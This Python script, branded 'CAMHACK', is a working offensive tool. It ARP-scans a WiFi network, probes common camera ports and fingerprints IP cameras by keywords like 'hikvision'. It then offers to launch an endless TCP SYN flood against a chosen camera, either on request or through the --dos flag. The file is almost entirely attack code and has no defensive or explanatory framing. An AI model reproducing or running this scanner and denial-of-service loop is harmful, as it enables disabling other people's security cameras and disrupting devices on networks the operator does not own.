import scapy.all as scapy
import socket
import argparse
import time
import requests
from rich.console import Console
from rich.progress import Progress, BarColumn, TimeRemainingColumn

console = Console()

def banner():
    console.print("""
[bold cyan]   ██████╗ █████╗ ███╗   ███╗██╗  ██╗ █████╗  ██████╗██╗  ██╗
  ██╔════╝██╔══██╗████╗ ████║██║  ██║██╔══██╗██╔════╝██║ ██╔╝
  ██║     ███████║██╔████╔██║███████║███████║██║     █████╔╝ 
  ██║     ██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║     ██╔═██╗ 
  ╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╗██║  ██╗
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

     [red]WiFi IP Camera Scanner & DoS Tool[/red]
""", justify="center")

def scan_network(network):
    """Scan the WiFi network for connected devices and check for cameras."""
    console.log(f"[bold blue]Scanning network: {network}")
    found_cameras = []
    
    ans, _ = scapy.arping(network, timeout=2, verbose=False)
    for sent, received in ans:
        ip = received.psrc
        mac = received.hwsrc
        console.log(f"[bold yellow]Device Found: {ip} - {mac}")
        
        if scan_ports(ip):
            found_cameras.append(ip)
    
    return found_cameras

def scan_ports(ip):
    """Check for open camera ports on the given IP."""
    common_ports = [80, 443, 554, 8080, 4747]  # HTTP, HTTPS, RTSP, DVR, Mobile Cams
    headers_to_check = ["Server", "Content-Type", "WWW-Authenticate", "X-Device-Type"]
    is_camera = False
    
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            sock.connect((ip, port))
            sock.close()
            console.log(f"[bold green]Port {port} open on {ip}")
            
            # Check headers for camera detection
            try:
                response = requests.get(f"http://{ip}:{port}", timeout=2)
                for header in headers_to_check:
                    if header in response.headers:
                        console.log(f"[bold cyan]{header}: {response.headers[header]}")
                        if "camera" in response.headers[header].lower() or "hikvision" in response.headers[header].lower():
                            console.log(f"[bold green]Possible camera detected at {ip}:{port}")
                            is_camera = True
                
                # Check response body for camera keywords
                if "camera" in response.text.lower() or "hikvision" in response.text.lower():
                    console.log(f"[bold green]Camera keywords found in response body at {ip}:{port}")
                    is_camera = True
            except Exception as e:
                console.log(f"[bold red]Error checking headers: {e}")
        except:
            pass
    
    return is_camera
def dos_attack(ip):
    """Perform a continuous DoS attack on the detected camera via packet flooding."""
    console.log(f"[bold red]Launching DoS attack on {ip}...")
    
    with Progress("[progress.description]{task.description}", BarColumn(), TimeRemainingColumn()) as progress:
        task = progress.add_task("Sending DoS packets", total=0)  # Infinite loop
        while True:
            # Send a flood of TCP packets
            scapy.send(scapy.IP(dst=ip) / scapy.TCP(dport=80, flags="S"), verbose=False)
            progress.update(task, advance=1)
            time.sleep(0.1)  # Adjust the sleep time to control the flood rate

def get_mac(ip):
    """Get the MAC address of a given IP using Scapy's built-in function."""
    try:
        return scapy.getmacbyip(ip)
    except:
        console.log(f"[bold red]Failed to resolve MAC address for {ip}")
        return None

if __name__ == "__main__":
    banner()
    scapy.ifaces.show()
    parser = argparse.ArgumentParser(description="WiFi IP Camera Scanner & DoS Tool")
    parser.add_argument("--network", type=str, help="Network range to scan (e.g., 192.168.43.0/24)", required=True)
    parser.add_argument("--dos", type=str, help="Target IP for DoS attack", required=False)
    args = parser.parse_args()
    
    if args.dos:
        dos_attack(args.dos)
    else:
        cameras = scan_network(args.network)
        if cameras:
            console.print("\n[bold cyan]Detected Cameras:")
            for cam in cameras:
                console.print(f"[bold green]{cam}")
                
            choice = input("Do you want to perform a DoS attack? (yes/no): ")
            if choice.lower() == "yes":
                target_ip = input("Enter the camera IP to attack: ")
                dos_attack(target_ip)
        else:
            console.print("[bold red]No cameras detected.")